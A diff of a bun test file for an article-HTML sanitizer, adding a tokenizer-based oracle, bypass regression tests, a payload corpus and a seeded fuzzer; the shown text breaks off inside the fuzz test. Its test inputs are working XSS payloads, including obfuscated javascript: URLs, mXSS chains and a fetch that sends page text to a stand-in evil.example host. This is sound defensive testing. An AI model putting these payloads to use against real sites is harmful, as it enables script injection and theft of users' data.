@@ -1,171 +1,565 @@
 // Article-HTML sanitizer (src/info/extract/sanitize.ts). Run: bun test.
+//
+// The sanitizer parses with a DOMParser; bun has none, so tests/dom.ts hands it
+// jsdom's (parse5, the same HTML5 spec WebKit implements) and the real code path
+// runs here.
+//
+// What the output means is never judged by reading the string. Every safety
+// assertion goes through HTMLRewriter (lol-html), a spec tokenizer: it reports
+// the elements and attributes a browser will actually see in the output, which
+// is the only thing that separates a neutralized payload from one that merely
+// moved. `expect(out).not.toContain("onclick")` would pass on a string that
+// spells the handler some other way.
 
 import { expect, test } from "bun:test";
+import "../dom";
 import { htmlToText, sanitizeArticleHtml, stripDataImages } from "../../src/info/extract/sanitize";
 
-test("drops scripts, styles, iframes, and event handlers", () => {
-  const out = sanitizeArticleHtml(
-    `<p onclick="steal()">Hi</p><script>evil()</script><style>x{}</style><iframe src="https://ad"></iframe>`,
+// --- oracle -----------------------------------------------------------------
+
+interface SeenElement {
+  tag: string;
+  attrs: [string, string][];
+}
+
+// Every element and attribute a browser's tokenizer finds in `html`.
+async function oracle(html: string): Promise<SeenElement[]> {
+  const seen: SeenElement[] = [];
+  await new HTMLRewriter()
+    .on("*", {
+      element(el) {
+        seen.push({ tag: el.tagName, attrs: [...el.attributes] });
+      },
+    })
+    .transform(new Response(html))
+    .text();
+  return seen;
+}
+
+// The policy, written out a second time so the test states it rather than
+// importing it from the code it is checking.
+const ALLOWED_TAGS = new Set([
+  "a", "abbr", "address", "article", "aside", "b", "bdi", "bdo", "blockquote", "br", "caption",
+  "cite", "code", "col", "colgroup", "dd", "del", "dfn", "div", "dl", "dt", "em", "figcaption",
+  "figure", "footer", "h1", "h2", "h3", "h4", "h5", "h6", "header", "hr", "i", "img", "ins", "kbd",
+  "li", "main", "mark", "ol", "p", "pre", "q", "rp", "rt", "ruby", "s", "samp", "section", "small",
+  "span", "strong", "sub", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "time", "tr",
+  "tt", "u", "ul", "var", "wbr",
+]);
+
+const ALLOWED_ATTRS: Record<string, string[]> = {
+  a: ["href", "target", "rel"],
+  img: ["src", "loading"],
+  td: ["colspan", "rowspan"],
+  th: ["colspan", "rowspan"],
+  ol: ["start"],
+  col: ["span"],
+  colgroup: ["span"],
+};
+
+const SAFE_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp|x-icon)[;,]/i;
+
+// Everything that would make this output unsafe in a webview, as the oracle
+// sees it. An empty list is the assertion; the strings are there so a failure
+// names the payload that produced them.
+async function violations(out: string): Promise<string[]> {
+  const bad: string[] = [];
+  for (const el of await oracle(out)) {
+    if (!ALLOWED_TAGS.has(el.tag)) bad.push(`element <${el.tag}>`);
+    const allowed = ALLOWED_ATTRS[el.tag] ?? [];
+    for (const [name, value] of el.attrs) {
+      if (name.startsWith("on")) bad.push(`handler ${el.tag}[${name}]`);
+      if (!allowed.includes(name)) {
+        bad.push(`attribute ${el.tag}[${name}]`);
+        continue;
+      }
+      if (name === "href" || name === "src") {
+        const url = value.replace(/[\u0000-\u001f\u007f]/g, "");
+        const ok = /^https?:\/\//i.test(url) || (el.tag === "img" && SAFE_DATA_IMAGE.test(url));
+        if (!ok) bad.push(`url ${el.tag}[${name}]=${value}`);
+      }
+      if (["colspan", "rowspan", "start", "span"].includes(name) && !/^\d{1,4}$/.test(value)) {
+        bad.push(`count ${el.tag}[${name}]=${value}`);
+      }
+    }
+  }
+  return bad;
+}
+
+async function expectSafe(source: string): Promise<string> {
+  const out = sanitizeArticleHtml(source);
+  expect(await violations(out)).toEqual([]);
+  // Sanitizing again must not resurrect anything either: the article view and
+  // the saved-article read path both run this over bodies that already went
+  // through it.
+  expect(await violations(sanitizeArticleHtml(out))).toEqual([]);
+  return out;
+}
+
+// The attributes the oracle finds on the first element of that name.
+async function attrsOf(out: string, tag: string): Promise<Record<string, string>> {
+  const el = (await oracle(out)).find((e) => e.tag === tag);
+  return el ? Object.fromEntries(el.attrs) : {};
+}
+
+// --- the two demonstrated bypasses ------------------------------------------
+
+// `[^>]*>` ends a tag at the first ">", but a tokenizer inside a double-quoted
+// attribute value does not: the whole thing is one tag, and the old scrubber
+// only ever saw "<marquee title="a". The handler reached the DOM intact.
+test("a > inside a quoted attribute value does not end the tag", async () => {
+  const out = await expectSafe(
+    `<marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>`,
   );
-  expect(out).toContain("<p>Hi</p>");
-  expect(out).not.toContain("script");
-  expect(out).not.toContain("onclick");
-  expect(out).not.toContain("iframe");
-  expect(out).not.toContain("x{}");
+  expect(await oracle(out)).toEqual([]);
+  expect(out).toBe("x");
 });
 
-test("keeps http(s) images and lets them load lazily", () => {
-  const out = sanitizeArticleHtml(`<img src="https://cdn.qbitai.com/a.jpg" onerror="x()" width="600">`);
-  expect(out).toContain('src="https://cdn.qbitai.com/a.jpg"');
-  expect(out).toContain('loading="lazy"');
+test("a > inside a single-quoted attribute value does not end the tag either", async () => {
+  const out = await expectSafe(`<p title='a>b' onclick=alert(1)>text</p>`);
+  expect(await attrsOf(out, "p")).toEqual({});
+  expect(out).toBe("<p>text</p>");
+});
+
+// Removing an attribute by replacing it with "" glued its neighbours together:
+// "on" + "click=alert(1)" is an onclick that was never in the input.
+test("removing an attribute cannot fuse its neighbours into a handler", async () => {
+  const out = await expectSafe(`<p on class="x"click=alert(1)>x</p>`);
+  expect(await attrsOf(out, "p")).toEqual({});
+  expect(out).toBe("<p>x</p>");
+});
+
+test("the same fusion through an unquoted value", async () => {
+  const out = await expectSafe(`<p on class=x click=alert(1) title=y>x</p>`);
+  expect(await attrsOf(out, "p")).toEqual({});
+});
+
+// --- handlers and schemes ---------------------------------------------------
+
+test("inline handlers go however they are written", async () => {
+  for (const html of [
+    `<p onclick="steal()">hi</p>`,
+    `<p onmouseover=alert(1)>hi</p>`,
+    `<p ONCLICK=alert(1)>hi</p>`,
+    "<p onclick=`alert(1)`>hi</p>",
+    `<p/onclick=alert(1)>hi</p>`,
+    `<p onclick\n=\nalert(1)>hi</p>`,
+    `<p onclick=alert(1) onmouseover='x' ONFOCUS=y autofocus>hi</p>`,
+    `<p OnClIcK=alert(1)>hi</p>`,
+    `<p on\u0000click=alert(1)>hi</p>`,
+  ]) {
+    const out = await expectSafe(html);
+    expect(await attrsOf(out, "p")).toEqual({});
+    expect(out).toContain("hi");
+  }
+});
+
+test("a javascript: href is dropped however it is spelled", async () => {
+  for (const href of [
+    "javascript:alert(1)",
+    "JaVaScRiPt:alert(1)",
+    "  javascript:alert(1)",
+    "jav&#x09;ascript:alert(1)",
+    "jav&#x0A;ascript:alert(1)",
+    "jav\tascript:alert(1)",
+    "java\u0000script:alert(1)",
+    "&#106;avascript:alert(1)",
+    "&#x6a;avascript:alert(1)",
+    "&amp;#106;avascript:alert(1)",
+    "&#38;#106;avascript:alert(1)",
+    "vbscript:msgbox(1)",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "about:blank",
+    "//evil.example/x",
+    "#anchor",
+  ]) {
+    const out = await expectSafe(`<a href="${href}">go</a>`);
+    expect(await attrsOf(out, "a")).toEqual({});
+    expect(out).toBe("<a>go</a>");
+  }
+});
+
+test("a quote or a newline inside an http URL cannot end the attribute", async () => {
+  const quoted = await expectSafe(`<a href='https://x/a"onmouseover=alert(1)'>x</a>`);
+  // The oracle reports an attribute value as it is written, entities and all;
+  // the quote is escaped, so it stays inside the value instead of ending it.
+  expect(await attrsOf(quoted, "a")).toEqual({
+    href: "https://x/a&quot;onmouseover=alert(1)",
+    target: "_blank",
+    rel: "noreferrer noopener",
+  });
+  // Tab, CR and LF are stripped from a URL by the renderer, so they are stripped
+  // before the scheme test and the value written out is the one that was tested.
+  const split = await expectSafe(`<img src="https://x/\ta\n.jpg">`);
+  expect(await attrsOf(split, "img")).toEqual({ src: "https://x/a.jpg", loading: "lazy" });
+});
+
+test("an http link keeps its href and opens outside the app", async () => {
+  const out = await expectSafe(`<a href="https://example.com" onclick="y()">x</a>`);
+  expect(await attrsOf(out, "a")).toEqual({
+    href: "https://example.com",
+    target: "_blank",
+    rel: "noreferrer noopener",
+  });
+});
+
+// --- elements whose content is not prose ------------------------------------
+
+test("script, style and the plugin elements go with their content", async () => {
+  const out = await expectSafe(
+    `<p onclick="steal()">Hi</p><script>evil()</script><style>x{}</style>` +
+      `<iframe src="https://ad"></iframe><object data="javascript:alert(1)"></object>` +
+      `<embed src="javascript:alert(1)"><form action="javascript:alert(1)">` +
+      `<button formaction="javascript:alert(1)">go</button></form>`,
+  );
+  expect(out).toBe("<p>Hi</p>");
+});
+
+test("svg goes with everything inside it", async () => {
+  for (const html of [
+    `<svg><script>alert(1)</script></svg>`,
+    `<svg><foreignObject><p onclick=alert(1)>t</p></foreignObject></svg>`,
+    `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
+    `<svg/onload=alert(1)>`,
+    `<svg><image href="javascript:alert(1)"></svg>`,
+    `<svg><desc><![CDATA[<img src=x onerror=alert(1)>]]></desc></svg>`,
+  ]) {
+    const out = await expectSafe(html);
+    expect(await oracle(out)).toEqual([]);
+  }
+});
+
+test("a nested svg does not let the outer one end early", async () => {
+  const out = await expectSafe(`<svg><svg></svg><script>alert(1)</script></svg><p>after</p>`);
+  expect(out).toBe("<p>after</p>");
+});
+
+test("MathML and the mtext/mglyph mXSS chain go too", async () => {
+  const out = await expectSafe(
+    `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><p>after</p>`,
+  );
+  expect(await oracle(out)).toEqual([{ tag: "p", attrs: [] }]);
+});
+
+test("raw-text and form elements take their payload with them", async () => {
+  for (const html of [
+    `<template><img src=x onerror=alert(1)></template>`,
+    `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
+    `<xmp><img src=x onerror=alert(1)></xmp>`,
+    `<plaintext><img src=x onerror=alert(1)>`,
+    `<textarea><img src=x onerror=alert(1)></textarea>`,
+    `<select><option><img src=x onerror=alert(1)></option></select>`,
+    `<title><img src=x onerror=alert(1)></title>`,
+    `<base href="javascript:"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
+  ]) {
+    const out = await expectSafe(html);
+    expect(await oracle(out)).toEqual([]);
+  }
+});
+
+// --- malformed markup -------------------------------------------------------
+
+test("malformed, unclosed and doubled-up tags stay harmless", async () => {
+  for (const html of [
+    `<<script>alert(1)//<</script>`,
+    `<img """><img src=x onerror="alert(1)">`,
+    `<p title="unclosed`,
+    `<a href="https://x`,
+    `<div><p>text`,
+    `</p>text</div></span>`,
+    `<p<p onclick=alert(1)>x`,
+    `<!--><img src=x onerror=alert(1)>-->`,
+    `<!-- <img src=x onerror=alert(1)> -->`,
+    `<![CDATA[<img src=x onerror=alert(1)>]]>`,
+    `<?xml-stylesheet href="javascript:alert(1)"?>`,
+    `<p onclick=alert(1)`,
+    `<p `.repeat(50),
+    `<div>`.repeat(600) + "deep" + `</div>`.repeat(600),
+  ]) {
+    await expectSafe(html);
+  }
+});
+
+test("an escaped payload stays text, at one level of encoding or two", async () => {
+  const once = await expectSafe(`<p>&lt;img src=x onerror=alert(1)&gt;</p>`);
+  expect(await oracle(once)).toEqual([{ tag: "p", attrs: [] }]);
+  const twice = await expectSafe(`<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>`);
+  expect(await oracle(twice)).toEqual([{ tag: "p", attrs: [] }]);
+  // Decoded once by the parser, written back escaped, so re-parsing gives the
+  // same text rather than a tag.
+  expect(twice).toBe("<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>");
+  const quoted = await expectSafe(`<div title="&quot;><img src=x onerror=alert(1)>">t</div>`);
+  expect(await oracle(quoted)).toEqual([{ tag: "div", attrs: [] }]);
+});
+
+// --- images -----------------------------------------------------------------
+
+test("keeps http(s) images and lets them load lazily", async () => {
+  const out = await expectSafe(`<img src="https://cdn.qbitai.com/a.jpg" onerror="x()" width="600">`);
+  expect(await attrsOf(out, "img")).toEqual({ src: "https://cdn.qbitai.com/a.jpg", loading: "lazy" });
   // The img: proxy fetches these, so a referrer policy on the tag would decide
   // nothing (docs/pitfall/30).
   expect(out).not.toContain("referrerpolicy");
-  expect(out).not.toContain("onerror");
-  expect(out).not.toContain("width");
 });
 
-test("drops images with a non-http/data src and no lazy fallback (relative, trackers)", () => {
-  expect(sanitizeArticleHtml(`<img src="/rel.jpg">`)).toBe("");
-  expect(sanitizeArticleHtml(`<img src="about:blank">`)).toBe("");
-  expect(sanitizeArticleHtml(`<img src="data:image/png;base64,AAAA">`)).toContain("data:image/png");
+test("drops images with a non-http/data src and no lazy fallback (relative, trackers)", async () => {
+  expect(await expectSafe(`<img src="/rel.jpg">`)).toBe("");
+  expect(await expectSafe(`<img src="about:blank">`)).toBe("");
+  expect(await expectSafe(`<img src="javascript:alert(1)">`)).toBe("");
+  expect(await expectSafe(`<img src="data:image/png;base64,AAAA">`)).toContain("data:image/png");
+  // Markup with its own parser, not a picture.
+  expect(await expectSafe(`<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">`)).toBe("");
+  expect(await expectSafe(`<img src="data:text/html;base64,PHNjcmlwdD4=">`)).toBe("");
 });
 
-test("recovers lazy-loaded images from data-src/srcset (WeChat/mmbiz mirrors)", () => {
+test("srcset is a source of candidate URLs, never an attribute of the output", async () => {
+  const ss = await expectSafe(`<img srcset="https://x/1x.jpg 1x, https://x/2x.jpg 2x">`);
+  expect(await attrsOf(ss, "img")).toEqual({ src: "https://x/1x.jpg", loading: "lazy" });
+  expect(await expectSafe(`<img data-srcset="https://x/d.jpg 1x">`)).toContain('src="https://x/d.jpg"');
+  expect(await expectSafe(`<img srcset="javascript:alert(1) 1x">`)).toBe("");
+  expect(await expectSafe(`<img srcset="data:text/html,<script>alert(1)</script> 1x">`)).toBe("");
+  const withSrc = await expectSafe(
+    `<img src="https://x/real.jpg" srcset="javascript:alert(1) 1x">`,
+  );
+  expect(await attrsOf(withSrc, "img")).toEqual({ src: "https://x/real.jpg", loading: "lazy" });
+});
+
+test("recovers lazy-loaded images from data-src/srcset (WeChat/mmbiz mirrors)", async () => {
   // Real mmbiz shape: no src, image only in data-src, fragment preserved.
-  const mm = sanitizeArticleHtml(
+  const mm = await expectSafe(
     `<img class="rich_pages" data-src="https://mmbiz.qpic.cn/sz_mmbiz_gif/a.gif?wx_fmt=gif&from=appmsg#imgIndex=1" data-ratio="0.51" data-type="gif">`,
   );
-  expect(mm).toContain('src="https://mmbiz.qpic.cn/sz_mmbiz_gif/a.gif?wx_fmt=gif&from=appmsg#imgIndex=1"');
-  expect(mm).toContain('loading="lazy"');
-  expect(mm).not.toContain("data-src");
-  expect(mm).not.toContain("data-ratio");
+  expect(await attrsOf(mm, "img")).toEqual({
+    src: "https://mmbiz.qpic.cn/sz_mmbiz_gif/a.gif?wx_fmt=gif&from=appmsg#imgIndex=1",
+    loading: "lazy",
+  });
 
   // Placeholder src + real data-src: the real image wins.
-  const ph = sanitizeArticleHtml(
+  const ph = await expectSafe(
     `<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" data-src="https://mmbiz.qpic.cn/real.jpg">`,
   );
   expect(ph).toContain('src="https://mmbiz.qpic.cn/real.jpg"');
   expect(ph).not.toContain("data:image");
 
   // Other lazy attributes.
-  expect(sanitizeArticleHtml(`<img data-original="https://x/o.jpg">`)).toContain('src="https://x/o.jpg"');
-  expect(sanitizeArticleHtml(`<img data-actual-src="https://x/a.jpg">`)).toContain('src="https://x/a.jpg"');
-
-  // srcset / data-srcset fall back to the first candidate URL.
-  const ss = sanitizeArticleHtml(`<img srcset="https://x/1x.jpg 1x, https://x/2x.jpg 2x">`);
-  expect(ss).toContain('src="https://x/1x.jpg"');
-  expect(sanitizeArticleHtml(`<img data-srcset="https://x/d.jpg 1x">`)).toContain('src="https://x/d.jpg"');
+  expect(await expectSafe(`<img data-original="https://x/o.jpg">`)).toContain('src="https://x/o.jpg"');
+  expect(await expectSafe(`<img data-actual-src="https://x/a.jpg">`)).toContain('src="https://x/a.jpg"');
 
   // A real http src still wins over lazy attributes.
-  expect(
-    sanitizeArticleHtml(`<img src="https://x/real.jpg" data-src="https://x/lazy.jpg">`),
-  ).toContain('src="https://x/real.jpg"');
-
-  // Protocol-relative URLs are normalized to https.
-  expect(sanitizeArticleHtml(`<img src="//cdn.x/p.jpg">`)).toContain('src="https://cdn.x/p.jpg"');
+  expect(await expectSafe(`<img src="https://x/real.jpg" data-src="https://x/lazy.jpg">`)).toContain(
+    'src="https://x/real.jpg"',
+  );
+  // Protocol-relative src is normalized rather than dropped.
+  expect(await expectSafe(`<img src="//cdn.x/p.jpg">`)).toContain('src="https://cdn.x/p.jpg"');
 });
 
-test("recovers images from off-list lazy attribute names (generic, not a whitelist)", () => {
-  // Names no hard-coded list would enumerate; the generic scan still finds them.
-  expect(sanitizeArticleHtml(`<img data-echo="https://x/e.jpg">`)).toContain('src="https://x/e.jpg"');
-  expect(sanitizeArticleHtml(`<img data-image="https://x/i.jpg">`)).toContain('src="https://x/i.jpg"');
-  expect(sanitizeArticleHtml(`<img data-flickity-lazyload="https://x/f.jpg">`)).toContain('src="https://x/f.jpg"');
-  // Extensionless CDN paths still qualify through the format parameter.
-  expect(sanitizeArticleHtml(`<img data-echo="https://mmbiz.qpic.cn/mmbiz_jpg/abc/640?wx_fmt=jpeg">`)).toContain(
+test("a <picture> collapses to the image its candidates name", async () => {
+  const real = await expectSafe(
+    `<picture><source srcset="https://x/big.webp 2x, https://x/small.webp 1x" type="image/webp">` +
+      `<source srcset="https://x/big.jpg"><img src="https://x/fallback.jpg" alt="a"></picture>`,
+  );
+  expect(await attrsOf(real, "img")).toEqual({ src: "https://x/fallback.jpg", loading: "lazy" });
+  // Only the <source> knows the URL: it still becomes the image rather than a
+  // <source> element the webview would fetch on its own rules.
+  const lazy = await expectSafe(
+    `<picture><source srcset="https://x/big.webp 2x"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>`,
+  );
+  expect(await attrsOf(lazy, "img")).toEqual({ src: "https://x/big.webp", loading: "lazy" });
+  expect(await expectSafe(`<picture><source srcset="javascript:alert(1) 1x"><img src="x"></picture>`)).toBe("");
+});
+
+test("a comma in a CDN path is part of the URL, not a srcset separator", async () => {
+  const out = await expectSafe(`<img src="https://cdn.x/w_800,h_600/a.jpg">`);
+  expect(await attrsOf(out, "img")).toEqual({
+    src: "https://cdn.x/w_800,h_600/a.jpg",
+    loading: "lazy",
+  });
+});
+
+test("an off-list attribute has to look like a picture to become a src", async () => {
+  expect(await expectSafe(`<img data-echo="https://x/e.jpg">`)).toContain('src="https://x/e.jpg"');
+  expect(await expectSafe(`<img data-image="https://x/i.jpg">`)).toContain('src="https://x/i.jpg"');
+  expect(await expectSafe(`<img data-flickity-lazyload="https://x/f.jpg">`)).toContain('src="https://x/f.jpg"');
+  expect(await expectSafe(`<img data-echo="https://mmbiz.qpic.cn/mmbiz_jpg/abc/640?wx_fmt=jpeg">`)).toContain(
     'src="https://mmbiz.qpic.cn/mmbiz_jpg/abc/640?wx_fmt=jpeg"',
   );
-});
 
-test("an off-list attribute that is not a picture never becomes a request", () => {
-  // Every src the sanitizer emits is fetched by the img: proxy, the app's only
-  // outbound request driven by third-party markup. Share links, analytics
-  // endpoints and canonical URLs sitting on an <img> must not reach it.
-  const beacons = sanitizeArticleHtml(
-    `<img data-share-url="https://social.example/post/1" data-track="https://beacon.example/p?id=1" data-canonical="https://news.example/article/9" title="https://ads.example/x">`,
+  // A share link or a beacon on the tag is not a picture, and an <img> with no
+  // picture at all is dropped rather than pointed at one.
+  const beacons = await expectSafe(
+    `<img data-share="https://social.example/post/1" data-track="https://t.example/px?id=9">`,
   );
   expect(beacons).toBe("");
-
-  // Even alone, with nothing else on the tag to prefer.
-  expect(sanitizeArticleHtml(`<img data-open="https://news.example/article/9">`)).toBe("");
-  expect(sanitizeArticleHtml(`<img data-echo="https://x/e">`)).toBe("");
-
-  // A real image on the same tag is unaffected: it is reached first.
-  const mixed = sanitizeArticleHtml(
-    `<img data-track="https://beacon.example/p?id=1" data-echo="https://x/photo.jpg">`,
-  );
-  expect(mixed).toContain('src="https://x/photo.jpg"');
-  expect(mixed).not.toContain("beacon.example");
-});
-
-test("prefers the image URL over a stray non-image link on the same img", () => {
-  // A real image URL (src or *src*) is always reached before the generic
-  // any-http-URL fallback, so a share/track link elsewhere on the tag is ignored.
-  const withSrc = sanitizeArticleHtml(
+  expect(await expectSafe(`<img data-open="https://news.example/article/9">`)).toBe("");
+  const withShare = await expectSafe(
     `<img src="https://x/photo.jpg" data-share-url="https://social.example/post/1">`,
   );
-  expect(withSrc).toContain('src="https://x/photo.jpg"');
-  expect(withSrc).not.toContain("social.example");
-
-  const withLazySrc = sanitizeArticleHtml(
-    `<img data-lazy-src="https://x/photo.jpg" data-share-url="https://social.example/post/1">`,
-  );
-  expect(withLazySrc).toContain('src="https://x/photo.jpg"');
-  expect(withLazySrc).not.toContain("social.example");
-  // An img carrying only a non-image http URL yields nothing at all; see the
-  // next test.
+  expect(await attrsOf(withShare, "img")).toEqual({ src: "https://x/photo.jpg", loading: "lazy" });
 });
 
-test("neutralizes javascript: anchors, keeps http links with rel/noreferrer", () => {
-  const js = sanitizeArticleHtml(`<a href="javascript:alert(1)">x</a>`);
-  expect(js).toBe("<a>x</a>");
-  const ok = sanitizeArticleHtml(`<a href="https://example.com" onclick="y()">x</a>`);
-  expect(ok).toContain('href="https://example.com"');
-  expect(ok).toContain('rel="noreferrer noopener"');
-  expect(ok).not.toContain("onclick");
-});
+// --- what a real article keeps ----------------------------------------------
 
-// An unquoted attribute value is legal HTML and ends at whitespace or ">", so a
-// handler written without quotes used to walk straight through the scrubber:
-// `<p onmouseover=alert(1)>` came out unchanged and the article view renders the
-// result with dangerouslySetInnerHTML. A hostile page the collector fetched, or
-// a body edited into the synced folder, is the realistic way that arrives.
-test("strips inline handlers written without quotes", () => {
-  expect(sanitizeArticleHtml(`<p onmouseover=alert(1)>hi</p>`)).toBe("<p>hi</p>");
-  expect(sanitizeArticleHtml(`<p ONCLICK=alert(1)>x</p>`)).toBe("<p>x</p>");
-  expect(sanitizeArticleHtml("<p onclick=`alert(1)`>x</p>")).toBe("<p>x</p>");
-  expect(sanitizeArticleHtml(`<body onload=alert(1)>`)).toBe("<body>");
-});
-
-// A solidus inside a tag is an ignored self-closing marker to the tokenizer, so
-// `<p/onclick=…>` is a <p> with a handler. Matching only on whitespace before
-// the attribute name missed it.
-test("strips a handler separated from the tag name by a solidus", () => {
-  expect(sanitizeArticleHtml(`<p/onclick=alert(1)>x</p>`)).toBe("<p>x</p>");
-});
-
-test("strips an unquoted javascript: URL on any attribute", () => {
-  expect(sanitizeArticleHtml(`<blockquote cite=javascript:alert(1)>x</blockquote>`)).toBe(
+test("prose is left alone", async () => {
+  const html = `<p>hi <b>there</b></p><h2>T</h2><ul><li>x</li></ul>`;
+  expect(await expectSafe(html)).toBe(html);
+  expect(await expectSafe(`<p class=big style=color:red id=x>x</p>`)).toBe("<p>x</p>");
+  expect(await expectSafe(`<blockquote cite=javascript:alert(1)>x</blockquote>`)).toBe(
     "<blockquote>x</blockquote>",
   );
-});
-
-test("unquoted presentational attributes go too, and prose is left alone", () => {
-  expect(sanitizeArticleHtml(`<p class=big style=color:red>x</p>`)).toBe("<p>x</p>");
-  expect(sanitizeArticleHtml(`<p>hi <b>there</b></p><h2>T</h2><ul><li>x</li></ul>`)).toBe(
-    "<p>hi <b>there</b></p><h2>T</h2><ul><li>x</li></ul>",
+  // A table keeps the spans that make it readable, as digits.
+  const table = await expectSafe(
+    `<table><tr><td colspan="2" onclick=alert(1)>a</td><td colspan="x(1)">b</td></tr></table>`,
+  );
+  expect(table).toBe("<table><tbody><tr><td colspan=\"2\">a</td><td>b</td></tr></tbody></table>");
+  expect(await expectSafe(`<ol start="3" onclick=x()><li>a</li></ol>`)).toBe(
+    '<ol start="3"><li>a</li></ol>',
+  );
+  // An unlisted wrapper costs its tag, not its text.
+  expect(await expectSafe(`<p><font color=red>keep</font> <custom-card>this</custom-card></p>`)).toBe(
+    "<p>keep this</p>",
   );
 });
+
+test("an element the parser puts outside the body is not smuggled in", async () => {
+  // <body onload> sets an attribute on the document's body; there is no element
+  // in the fragment at all, so nothing renders.
+  expect(await expectSafe(`<body onload=alert(1)>`)).toBe("");
+  expect(await expectSafe(`<html><head><script>alert(1)</script></head><body><p>x</p></body></html>`)).toBe(
+    "<p>x</p>",
+  );
+});
+
+test("without a DOMParser there is no sanitizer, so there is no body", () => {
+  const saved = globalThis.DOMParser;
+  // @ts-expect-error - putting the runtime back to what bun ships.
+  delete globalThis.DOMParser;
+  try {
+    expect(sanitizeArticleHtml(`<p>text</p>`)).toBe("");
+  } finally {
+    globalThis.DOMParser = saved;
+  }
+});
+
+// --- a sweep over the payloads that did not earn a test of their own --------
+
+test("nothing in the payload corpus survives", async () => {
+  const corpus = [
+    `<img src=x onerror=alert(1)//>`,
+    `<img src=x:alert(1) onerror=eval(src) `,
+    `<a href="https://ok.example" onfocus=alert(1) autofocus>x</a>`,
+    `<div style="background:url(javascript:alert(1))">x</div>`,
+    `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
+    `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
+    `<style>@import 'javascript:alert(1)';</style><p>x</p>`,
+    `<p style="width:expression(alert(1))">x</p>`,
+    `<a href="https://ok.example/">ok</a><a href="javascript:alert(1)">bad</a>`,
+    `<video><source src="javascript:alert(1)"></video>`,
+    `<audio src=x onerror=alert(1)>`,
+    `<details open ontoggle=alert(1)>x</details>`,
+    `<marquee onstart=alert(1)>x</marquee>`,
+    `<isindex action="javascript:alert(1)">`,
+    `<object type="text/html" data="https://evil.example/"></object>`,
+    `<meta charset="utf-8"><p>x</p>`,
+    `<p>a</p><script src="https://evil.example/x.js"></script>`,
+    `<p title="a>" onclick="alert(1)">b</p>`,
+    `<p title='a>' onclick=alert(1)>b</p>`,
+    `<p title=a> onclick=alert(1)>b</p>`,
+    `<img title="a>" onerror="alert(1)" src="https://x/a.jpg">`,
+    `<a title="a>" href="javascript:alert(1)">x</a>`,
+    `<a href="https://x/a" title="b>" onclick=alert(1)>x</a>`,
+    `<p on click=alert(1)>x</p>`,
+    `<p on\tclass="x"click=alert(1)>x</p>`,
+    `<p on/class="x"click=alert(1)>x</p>`,
+    `<p class="on"click=alert(1)>x</p>`,
+    `<p data-x="y"onclick=alert(1)>x</p>`,
+    `<svg><style><img src=x onerror=alert(1)></style></svg>`,
+    `<svg><set attributeName="onload" to="alert(1)"></svg>`,
+    `<form><input type=image src=x onerror=alert(1)></form>`,
+    `<p>&#60;script&#62;alert(1)&#60;/script&#62;</p>`,
+    `<p>&#x3c;img src=x onerror=alert(1)&#x3e;</p>`,
+    `<div><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">x</a></div>`,
+    `<a href="https://x/a?b=1&amp;c=2">x</a>`,
+    `<p>text with & an ampersand < and a bracket</p>`,
+  ];
+  for (const html of corpus) await expectSafe(html);
+});
+
+// --- a seeded fuzz over the same shapes -------------------------------------
+
+// The corpus above is what someone thought of. This is 2000 payloads nobody
+// thought of: tag names, attribute names, separators, quoting and text glued
+// together at random, with a fixed seed so a failure is reproducible. The
+// judge is the same oracle, so a bypass shows up as an element or attribute in
+// the output that the allowlist never named. Against the regex sanitizer this
+// replaced, this run reports hundreds of leaks.
+function mulberry32(seed: number): () => number {
+  let a = seed;
+  return () => {
+    a = (a + 0x6d2b79f5) | 0;
+    let t = Math.imul(a ^ (a >>> 15), 1 | a);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+const FUZZ_TAGS = [
+  "p", "div", "img", "a", "marquee", "svg", "math", "script", "style", "template", "noscript",
+  "iframe", "form", "table", "td", "foreignObject", "mglyph", "mtext", "xmp", "textarea", "title",
+  "select", "option", "plaintext", "body", "custom-el", "p<p", "annotation-xml", "picture",
+  "source", "ol", "li",
+];
+const FUZZ_ATTRS = [
+  "onclick", "onerror", "onload", "on", "class", "style", "src", "href", "srcset", "data-src",
+  "title", "xlink:href", "formaction", "colspan", "id", "click", "onstart", "value", "start",
+];
+const FUZZ_VALUES = [
+  '"a>"', "'a>'", "a>", '"javascript:alert(1)"', "javascript:alert(1)", '"jav&#x09;ascript:alert(1)"',
+  '"https://x/a.jpg"', '"//x/a.jpg"', '"data:image/svg+xml,<svg/onload=alert(1)>"', '"alert(1)"',
+  "alert(1)", "`alert(1)`", '"x"', "x", '""', "", '"&quot;><img src=x onerror=alert(1)>"',
+  '"https://x/a\\"onerror=alert(1)"', '"\u0000javascript:alert(1)"',
+];
+const FUZZ_SEPS = [" ", "\t", "\n", "/", "", "//", " \n ", "\u0000"];
+const FUZZ_TEXT = ["hi", "<", ">", "&", "&lt;img src=x onerror=alert(1)&gt;", "&amp;lt;", "]]>", "<!--", "-->", "\u0000"];
+
+test("2000 seeded random payloads produce nothing off the allowlist", async () => {
+  const rand = mulberry32(20260813);
+  const pick = <T,>(a: T[]): T => a[Math.floor(rand() * a.length)];
+  const tag = (): string => {
+    const name = pick(FUZZ_TAGS);
+    let s = `<${name}`;
+    for (let i = 0, n = Math.floor(rand() * 3); i < n; i += 1) {
+      const v = pick(FUZZ_VALUES);
